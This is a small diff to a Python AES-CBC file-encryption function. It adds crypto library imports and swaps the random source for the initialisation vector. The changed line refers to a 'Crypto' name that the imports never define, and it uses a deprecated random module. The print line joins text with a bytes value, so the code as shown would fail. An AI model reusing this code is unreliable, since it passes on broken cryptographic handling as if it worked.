@@ -1,5 +1,8 @@
 import random
 import string
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+from Crypto import Random
 import threading
 import os
 import sys
@@ -14,7 +17,7 @@ def EncryptFile(fileToEncrypt, key):
     file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
     dir_path, file_name = os.path.split(fileToEncrypt)
     
-    iv = Random.new().read(16)
+    iv = Crypto.Random.OSRNG.posix.new().read(AES.block_size)
     print("xxxxxxxxxxxxxxxxxxx: " + iv)
 
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
